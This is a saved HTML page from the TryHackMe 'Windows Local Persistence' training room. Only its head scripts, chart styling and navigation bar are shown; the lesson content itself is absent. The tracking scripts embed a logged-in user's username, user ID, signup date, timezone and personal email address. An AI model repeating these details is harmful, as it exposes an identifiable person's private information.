<!DOCTYPE html>
<!-- saved from url=(0050)https://tryhackme.com/room/windowslocalpersistence -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>TryHackMe | Windows Local Persistence</title>
<meta name="description" content="Learn the most common persistence techniques used on Windows machines.">
<meta name="og:description" content="Learn the most common persistence techniques used on Windows machines.">
<meta name="keywords" content="cyber,security,cyber security,cyber security training,coding,computer,bitcoin,hacking,hackers,hacks,hack,exploits,keylogger,learn,poc">
<meta name="viewport" content="width=device-width,initial-scale=1.0">

<meta property="og:site_name" content="TryHackMe">
<meta property="og:title" content="TryHackMe | Windows Local Persistence">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/d566e150cc33c06b696981aeb0e1af59.png">
<meta property="og:url" content="https://tryhackme.com/room/windowslocalpersistence">
<meta name="twitter:image" content="https://tryhackme.com/img/meta/default.png">
<meta property="og:description" content="Learn the most common persistence techniques used on Windows machines.">

<script type="text/javascript" async="" src="./TryHackMe _ Windows Local Persistence_files/pgpbhph6"></script><script src="./TryHackMe _ Windows Local Persistence_files/jquery.min.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/popper.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Windows Local Persistence_files/boostrap431.min.css">
<script src="./TryHackMe _ Windows Local Persistence_files/bootstrap431.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Windows Local Persistence_files/animate.min.css">
<link rel="stylesheet" href="./TryHackMe _ Windows Local Persistence_files/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
<link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png">
<link rel="stylesheet" media="screen" href="./TryHackMe _ Windows Local Persistence_files/general-style.css">
<script src="./TryHackMe _ Windows Local Persistence_files/script.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/validation.js"></script>

<link rel="stylesheet" type="text/css" href="./TryHackMe _ Windows Local Persistence_files/cookieconsent.min.css">
<script src="./TryHackMe _ Windows Local Persistence_files/cookieconsent.min.js"></script>
<script async="" src="./TryHackMe _ Windows Local Persistence_files/js"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
  
    gtag('config', 'G-Z8D4WL3D4P');
  </script>


<script>
    window.intercomSettings = {
      api_base: "https://api-iam.intercom.io",
      app_id: "pgpbhph6"
    };
  </script>
<script>
    (function (h, o, t, j, a, r) {
      h.hj = h.hj || function () { (h.hj.q = h.hj.q || []).push(arguments) };
      h._hjSettings = { hjid: 1950941, hjsv: 6 };
      a = o.getElementsByTagName('head')[0];
      r = o.createElement('script'); r.async = 1;
      r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
      a.appendChild(r);
    })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
  </script><script async="" src="./TryHackMe _ Windows Local Persistence_files/hotjar-1950941.js"></script>
<script>
    /* Global javascript variables */

    // Used inside script.js for createRooms compelted users.
    const username = 'Silv3rsurf3r'
    const subscribed = '1'
    const level = '10'
    const intercomEnabled = 'true'
  </script>
<script>
    //add back tracking info
    const userId = "63d14e7f857ae10041bb192f"
    let tutorialComplete = false
    if ('false' == "true") {
      tutorialComplete = true
    }
    if(intercomEnabled === "true"){
      window.intercomSettings = {
        api_base: "https://api-iam.intercom.io",
        app_id: "pgpbhph6",
        user_id: userId,
        username: username,
        email: "giftonpaul@karunya.edu.in",
        created_at: Math.floor(new Date("Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)").getTime() / 1000) // Signup date as a Unix timestamp
      };
    }
    window.hj('identify', userId, {
      displayName: username,
      subscribed: "1",
      dateSignUp: "Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)",
      experience: "advanced"
    })
  </script>
<script type="application/ld+json">

   {
      "@context":"https://schema.org",
      "@type":"Organization",
      "url":"https://tryhackme.com",
      "name":"TryHackMe",
      "logo":"https://tryhackme.com/img/favicon.png",
      "description":"TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!",
      "email": "support@tryhackme.com",
      "sameAs":[
         "https://www.linkedin.com/company/tryhackme",
         "https://twitter.com/realtryhackme"
      ]
   }

</script>
<script>
    console.log(`%c
      ------------------
      < Happy Hacking! >
      ------------------
              \\   ^__^
               \\  (oo)\\_______
                  (__)\\       )\\/\\
                      ||----w |
                      ||     ||`, "font-family:monospace")
  </script>
<script>
  (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/pgpbhph6';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(document.readyState==='complete'){l();}else if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
</script>
<script src="./TryHackMe _ Windows Local Persistence_files/socket.io.js"></script><script>
  let socket = io.connect({
    transports: ['websocket'],
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionAttempts: 10
  })
</script><style type="text/css">.apexcharts-canvas {
  position: relative;
  user-select: none;
  /* cannot give overflow: hidden as it will crop tooltips which overflow outside chart area */
}


/* scrollbar is not visible by default for legend, hence forcing the visibility */
.apexcharts-canvas ::-webkit-scrollbar {
  -webkit-appearance: none;
  width: 6px;
}

.apexcharts-canvas ::-webkit-scrollbar-thumb {
  border-radius: 4px;
  background-color: rgba(0, 0, 0, .5);
  box-shadow: 0 0 1px rgba(255, 255, 255, .5);
  -webkit-box-shadow: 0 0 1px rgba(255, 255, 255, .5);
}


.apexcharts-inner {
  position: relative;
}

.apexcharts-text tspan {
  font-family: inherit;
}

.legend-mouseover-inactive {
  transition: 0.15s ease all;
  opacity: 0.20;
}

.apexcharts-series-collapsed {
  opacity: 0;
}

.apexcharts-tooltip {
  border-radius: 5px;
  box-shadow: 2px 2px 6px -4px #999;
  cursor: default;
  font-size: 14px;
  left: 62px;
  opacity: 0;
  pointer-events: none;
  position: absolute;
  top: 20px;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  white-space: nowrap;
  z-index: 12;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-theme-light {
  border: 1px solid #e3e3e3;
  background: rgba(255, 255, 255, 0.96);
}

.apexcharts-tooltip.apexcharts-theme-dark {
  color: #fff;
  background: rgba(30, 30, 30, 0.8);
}

.apexcharts-tooltip * {
  font-family: inherit;
}


.apexcharts-tooltip-title {
  padding: 6px;
  font-size: 15px;
  margin-bottom: 4px;
}

.apexcharts-tooltip.apexcharts-theme-light .apexcharts-tooltip-title {
  background: #ECEFF1;
  border-bottom: 1px solid #ddd;
}

.apexcharts-tooltip.apexcharts-theme-dark .apexcharts-tooltip-title {
  background: rgba(0, 0, 0, 0.7);
  border-bottom: 1px solid #333;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  display: inline-block;
  font-weight: 600;
  margin-left: 5px;
}

.apexcharts-tooltip-text-y-label:empty,
.apexcharts-tooltip-text-y-value:empty,
.apexcharts-tooltip-text-goals-label:empty,
.apexcharts-tooltip-text-goals-value:empty,
.apexcharts-tooltip-text-z-value:empty {
  display: none;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  font-weight: 600;
}

.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-goals-group, 
.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  display: flex;
}
.apexcharts-tooltip-text-goals-label:not(:empty),
.apexcharts-tooltip-text-goals-value:not(:empty) {
  margin-top: -6px;
}

.apexcharts-tooltip-marker {
  width: 12px;
  height: 12px;
  position: relative;
  top: 0px;
  margin-right: 10px;
  border-radius: 50%;
}

.apexcharts-tooltip-series-group {
  padding: 0 10px;
  display: none;
  text-align: left;
  justify-content: left;
  align-items: center;
}

.apexcharts-tooltip-series-group.apexcharts-active .apexcharts-tooltip-marker {
  opacity: 1;
}

.apexcharts-tooltip-series-group.apexcharts-active,
.apexcharts-tooltip-series-group:last-child {
  padding-bottom: 4px;
}

.apexcharts-tooltip-series-group-hidden {
  opacity: 0;
  height: 0;
  line-height: 0;
  padding: 0 !important;
}

.apexcharts-tooltip-y-group {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-box, .apexcharts-custom-tooltip {
  padding: 4px 8px;
}

.apexcharts-tooltip-boxPlot {
  display: flex;
  flex-direction: column-reverse;
}

.apexcharts-tooltip-box>div {
  margin: 4px 0;
}

.apexcharts-tooltip-box span.value {
  font-weight: bold;
}

.apexcharts-tooltip-rangebar {
  padding: 5px 8px;
}

.apexcharts-tooltip-rangebar .category {
  font-weight: 600;
  color: #777;
}

.apexcharts-tooltip-rangebar .series-name {
  font-weight: bold;
  display: block;
  margin-bottom: 5px;
}

.apexcharts-xaxistooltip {
  opacity: 0;
  padding: 9px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
  transition: 0.15s ease all;
}

.apexcharts-xaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-xaxistooltip:after,
.apexcharts-xaxistooltip:before {
  left: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-xaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-left: -6px;
}

.apexcharts-xaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-left: -7px;
}

.apexcharts-xaxistooltip-bottom:after,
.apexcharts-xaxistooltip-bottom:before {
  bottom: 100%;
}

.apexcharts-xaxistooltip-top:after,
.apexcharts-xaxistooltip-top:before {
  top: 100%;
}

.apexcharts-xaxistooltip-bottom:after {
  border-bottom-color: #ECEFF1;
}

.apexcharts-xaxistooltip-bottom:before {
  border-bottom-color: #90A4AE;
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:after {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:before {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top:after {
  border-top-color: #ECEFF1
}

.apexcharts-xaxistooltip-top:before {
  border-top-color: #90A4AE;
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:after {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:before {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-yaxistooltip {
  opacity: 0;
  padding: 4px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
}

.apexcharts-yaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-yaxistooltip:after,
.apexcharts-yaxistooltip:before {
  top: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-yaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-top: -6px;
}

.apexcharts-yaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-top: -7px;
}

.apexcharts-yaxistooltip-left:after,
.apexcharts-yaxistooltip-left:before {
  left: 100%;
}

.apexcharts-yaxistooltip-right:after,
.apexcharts-yaxistooltip-right:before {
  right: 100%;
}

.apexcharts-yaxistooltip-left:after {
  border-left-color: #ECEFF1;
}

.apexcharts-yaxistooltip-left:before {
  border-left-color: #90A4AE;
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:after {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:before {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right:after {
  border-right-color: #ECEFF1;
}

.apexcharts-yaxistooltip-right:before {
  border-right-color: #90A4AE;
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:after {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:before {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip.apexcharts-active {
  opacity: 1;
}

.apexcharts-yaxistooltip-hidden {
  display: none;
}

.apexcharts-xcrosshairs,
.apexcharts-ycrosshairs {
  pointer-events: none;
  opacity: 0;
  transition: 0.15s ease all;
}

.apexcharts-xcrosshairs.apexcharts-active,
.apexcharts-ycrosshairs.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-ycrosshairs-hidden {
  opacity: 0;
}

.apexcharts-selection-rect {
  cursor: move;
}

.svg_select_boundingRect, .svg_select_points_rot {
  pointer-events: none;
  opacity: 0;
  visibility: hidden;
}
.apexcharts-selection-rect + g .svg_select_boundingRect,
.apexcharts-selection-rect + g .svg_select_points_rot {
  opacity: 0;
  visibility: hidden;
}

.apexcharts-selection-rect + g .svg_select_points_l,
.apexcharts-selection-rect + g .svg_select_points_r {
  cursor: ew-resize;
  opacity: 1;
  visibility: visible;
}

.svg_select_points {
  fill: #efefef;
  stroke: #333;
  rx: 2;
}

.apexcharts-svg.apexcharts-zoomable.hovering-zoom {
  cursor: crosshair
}

.apexcharts-svg.apexcharts-zoomable.hovering-pan {
  cursor: move
}

.apexcharts-zoom-icon,
.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon,
.apexcharts-reset-icon,
.apexcharts-pan-icon,
.apexcharts-selection-icon,
.apexcharts-menu-icon,
.apexcharts-toolbar-custom-icon {
  cursor: pointer;
  width: 20px;
  height: 20px;
  line-height: 24px;
  color: #6E8192;
  text-align: center;
}

.apexcharts-zoom-icon svg,
.apexcharts-zoomin-icon svg,
.apexcharts-zoomout-icon svg,
.apexcharts-reset-icon svg,
.apexcharts-menu-icon svg {
  fill: #6E8192;
}

.apexcharts-selection-icon svg {
  fill: #444;
  transform: scale(0.76)
}

.apexcharts-theme-dark .apexcharts-zoom-icon svg,
.apexcharts-theme-dark .apexcharts-zoomin-icon svg,
.apexcharts-theme-dark .apexcharts-zoomout-icon svg,
.apexcharts-theme-dark .apexcharts-reset-icon svg,
.apexcharts-theme-dark .apexcharts-pan-icon svg,
.apexcharts-theme-dark .apexcharts-selection-icon svg,
.apexcharts-theme-dark .apexcharts-menu-icon svg,
.apexcharts-theme-dark .apexcharts-toolbar-custom-icon svg {
  fill: #f3f4f5;
}

.apexcharts-canvas .apexcharts-zoom-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-selection-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-reset-zoom-icon.apexcharts-selected svg {
  fill: #008FFB;
}

.apexcharts-theme-light .apexcharts-selection-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoom-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoomin-icon:hover svg,
.apexcharts-theme-light .apexcharts-zoomout-icon:hover svg,
.apexcharts-theme-light .apexcharts-reset-icon:hover svg,
.apexcharts-theme-light .apexcharts-menu-icon:hover svg {
  fill: #333;
}

.apexcharts-selection-icon,
.apexcharts-menu-icon {
  position: relative;
}

.apexcharts-reset-icon {
  margin-left: 5px;
}

.apexcharts-zoom-icon,
.apexcharts-reset-icon,
.apexcharts-menu-icon {
  transform: scale(0.85);
}

.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon {
  transform: scale(0.7)
}

.apexcharts-zoomout-icon {
  margin-right: 3px;
}

.apexcharts-pan-icon {
  transform: scale(0.62);
  position: relative;
  left: 1px;
  top: 0px;
}

.apexcharts-pan-icon svg {
  fill: #fff;
  stroke: #6E8192;
  stroke-width: 2;
}

.apexcharts-pan-icon.apexcharts-selected svg {
  stroke: #008FFB;
}

.apexcharts-pan-icon:not(.apexcharts-selected):hover svg {
  stroke: #333;
}

.apexcharts-toolbar {
  position: absolute;
  z-index: 11;
  max-width: 176px;
  text-align: right;
  border-radius: 3px;
  padding: 0px 6px 2px 6px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.apexcharts-menu {
  background: #fff;
  position: absolute;
  top: 100%;
  border: 1px solid #ddd;
  border-radius: 3px;
  padding: 3px;
  right: 10px;
  opacity: 0;
  min-width: 110px;
  transition: 0.15s ease all;
  pointer-events: none;
}

.apexcharts-menu.apexcharts-menu-open {
  opacity: 1;
  pointer-events: all;
  transition: 0.15s ease all;
}

.apexcharts-menu-item {
  padding: 6px 7px;
  font-size: 12px;
  cursor: pointer;
}

.apexcharts-theme-light .apexcharts-menu-item:hover {
  background: #eee;
}

.apexcharts-theme-dark .apexcharts-menu {
  background: rgba(0, 0, 0, 0.7);
  color: #fff;
}

@media screen and (min-width: 768px) {
  .apexcharts-canvas:hover .apexcharts-toolbar {
    opacity: 1;
  }
}

.apexcharts-datalabel.apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-pie-label,
.apexcharts-datalabels,
.apexcharts-datalabel,
.apexcharts-datalabel-label,
.apexcharts-datalabel-value {
  cursor: default;
  pointer-events: none;
}

.apexcharts-pie-label-delay {
  opacity: 0;
  animation-name: opaque;
  animation-duration: 0.3s;
  animation-fill-mode: forwards;
  animation-timing-function: ease;
}

.apexcharts-canvas .apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-hide .apexcharts-series-points {
  opacity: 0;
}

.apexcharts-gridline,
.apexcharts-annotation-rect,
.apexcharts-tooltip .apexcharts-marker,
.apexcharts-area-series .apexcharts-area,
.apexcharts-line,
.apexcharts-zoom-rect,
.apexcharts-toolbar svg,
.apexcharts-area-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-line-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-radar-series path,
.apexcharts-radar-series polygon {
  pointer-events: none;
}


/* markers */

.apexcharts-marker {
  transition: 0.15s ease all;
}

@keyframes opaque {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}


/* Resize generated styles */

@keyframes resizeanim {
  from {
    opacity: 0;
  }
  to {
    opacity: 0;
  }
}

.resize-triggers {
  animation: 1ms resizeanim;
  visibility: hidden;
  opacity: 0;
}

.resize-triggers,
.resize-triggers>div,
.contract-trigger:before {
  content: " ";
  display: block;
  position: absolute;
  top: 0;
  left: 0;
  height: 100%;
  width: 100%;
  overflow: hidden;
}

.resize-triggers>div {
  background: #eee;
  overflow: auto;
}

.contract-trigger:before {
  width: 200%;
  height: 200%;
}</style><style data-jss="" data-meta="MuiDialog">
@media print {
  .MuiDialog-root {
    position: absolute !important;
  }
}
.MuiDialog-scrollPaper {
  display: flex;
  align-items: center;
  justify-content: center;
}
.MuiDialog-scrollBody {
  overflow-x: hidden;
  overflow-y: auto;
  text-align: center;
}
.MuiDialog-scrollBody:after {
  width: 0;
  height: 100%;
  content: "";
  display: inline-block;
  vertical-align: middle;
}
.MuiDialog-container {
  height: 100%;
  outline: 0;
}
@media print {
  .MuiDialog-container {
    height: auto;
  }
}
.MuiDialog-paper {
  margin: 32px;
  position: relative;
  overflow-y: auto;
}
@media print {
  .MuiDialog-paper {
    box-shadow: none;
    overflow-y: visible;
  }
}
.MuiDialog-paperScrollPaper {
  display: flex;
  max-height: calc(100% - 64px);
  flex-direction: column;
}
.MuiDialog-paperScrollBody {
  display: inline-block;
  text-align: left;
  vertical-align: middle;
}
.MuiDialog-paperWidthFalse {
  max-width: calc(100% - 64px);
}
.MuiDialog-paperWidthXs {
  max-width: 444px;
}
@media (max-width:507.95px) {
  .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthSm {
  max-width: 600px;
}
@media (max-width:663.95px) {
  .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthMd {
  max-width: 960px;
}
@media (max-width:1023.95px) {
  .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthLg {
  max-width: 1280px;
}
@media (max-width:1343.95px) {
  .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthXl {
  max-width: 1920px;
}
@media (max-width:1983.95px) {
  .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperFullWidth {
  width: calc(100% - 64px);
}
.MuiDialog-paperFullScreen {
  width: 100%;
  height: 100%;
  margin: 0;
  max-width: 100%;
  max-height: none;
  border-radius: 0;
}
.MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
  margin: 0;
  max-width: 100%;
}
</style><script async="" src="./TryHackMe _ Windows Local Persistence_files/modules.5957fbf26d1b525b5a12.js" charset="utf-8"></script><style></style></head>


<body><div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override-382972913 cc-invisible" style="display: none;"><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">We use cookies to ensure you get the best user experience. For more information contact us. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://tryhackme.com/legal/terms-of-use" target="_blank">Read more</a></span><div class="cc-compliance"><a aria-label="dismiss cookie message" role="button" tabindex="0" class="cc-btn cc-dismiss">Got it!</a></div><!--googleon: all--></div>
<link href="./TryHackMe _ Windows Local Persistence_files/scoreboard.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Windows Local Persistence_files/introjs.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Windows Local Persistence_files/slideout.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Windows Local Persistence_files/public-rooms.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Windows Local Persistence_files/asciinema-player.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Windows Local Persistence_files/prism.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Windows Local Persistence_files/magnific-popup.css" rel="stylesheet" type="text/css"> 
<script src="./TryHackMe _ Windows Local Persistence_files/lottie-player.js"></script>

<div id="room-content">
<div id="room-content-main">
<nav class="navbar navbar-expand-md navbar-dark navbar-color-loggedin navbar-main">
<div class="container">
<button id="thm-mobile-nav-open" class="thm-nav__hamburger-btn" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Open mobile navigation">
<span class="thm-nav__hamburger-lines"></span>
</button>
<div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
<div class="navbar-brand" href="/">
<a href="https://tryhackme.com/dashboard">
<img width="115px" src="./TryHackMe _ Windows Local Persistence_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
</div>
<ul class="navbar-nav mr-auto mt-2 mt-lg-0 navbar-pagelinks">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="navbar-item-icon far fa-browser"></i>
<div class="navbar-item-text">Dashboard</div>
</a>
</li>
<li class="nav-item active" id="nav-learn">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="navbar-item-icon far fa-book-open"></i>
<div class="navbar-item-text">Learn</div>
</a>
</li>
<li class="nav-item  dropdown lite-removable">
<a id="nav-other" class="nav-link" href="https://tryhackme.com/room/windowslocalpersistence#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-trophy"></i>
<div class="navbar-item-text">Compete</div>
</a>
<div class="dropdown-menu" aria-labelledby="navbarDropdown">
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/leaderboards">
<div class="dropdown-menu-icon">
<i class="fas fa-trophy"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/games/koth">
<div class="dropdown-menu-icon">
<i class="fas fa-crown"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/workspace">
<div class="dropdown-menu-icon">
<i class="fas fa-user-friends"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item dropdown">
<a data-cy="nav-other-menu-button" id="nav-other" class="nav-link" href="https://tryhackme.com/room/windowslocalpersistence#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-ellipsis-h-alt"></i>
<div class="navbar-item-text">Other</div>
</a>
<div data-cy="nav-other-menu" class="dropdown-menu dropdown-menu-center large-dropdown" aria-labelledby="navbarDropdown">
<span class="dropdown-menu-arrow"></span>
<a class="dropdown-item" href="https://tryhackme.com/resources">Resources</a>
<a class="dropdown-item" href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a class="dropdown-item" href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/business">For Business</a>
<a class="dropdown-item" href="https://tryhackme.com/classrooms">For Education</a>
<a class="dropdown-item" target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
<a class="dropdown-item" href="https://tryhackme.com/glossary">Glossary</a>
</div>
</li>
</ul>
<ul class="navbar-nav navbar-right options vertical-align-custom">
<li class="nav-item" data-toggle="modal" data-target="#navConnModal">
<div id="thm-connection-status" class="thm-disconnected" style="display: flex;">
<div id="thm-connection-status-dot" class="dot-small"></div> <span id="thm-connection-status-txt" class="ml-2 size-18 text-white">Access Machines</span>
</div>
</li>
<li class="nav-item">
<div class="nav-item-streak">
<span id="streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
<span id="user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
<script>
                            let usersStreak = { // Global variable, used in rooms logic
                                streakFirstAnswered: new Date('Mon Jul 10 2023 03:13:45 GMT+0100 (British Summer Time)'),
                                streakLastAnswered: new Date('Sun Jul 16 2023 18:47:44 GMT+0100 (British Summer Time)'),
                                usersTimezone: 'Asia/Kolkata',
                                streakFreeze: 1
                            };
                            setSidebarStreaks(usersStreak.streakFirstAnswered, usersStreak.streakLastAnswered, usersStreak.usersTimezone, usersStreak.streakFreeze)
                        </script>
</div>
</li>
<li class="nav-item dropdown" id="notification-navitem">
<a class="nav-link vertical-align-custom size-22 pl-0" href="https://tryhackme.com/room/windowslocalpersistence#" id="notification-btn" role="button" data-toggle="dropdown">
<i id="notification-icon" class="fal fa-bell"></i>
<div id="notification-dot"></div>
</a>
<div id="nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="notification-header">Notifications</div>
<div id="nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item dropdown">
<a class="nav-link dropdown-toggle remove-arrow p-0" href="https://tryhackme.com/room/windowslocalpersistence#" id="navbarAvatarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
<img src="./TryHackMe _ Windows Local Persistence_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarAvatarDropdown">
<a class="dropdown-item" href="https://tryhackme.com/profile">Profile</a>
<a class="dropdown-item" href="https://tryhackme.com/referrals">Refer a friend</a>
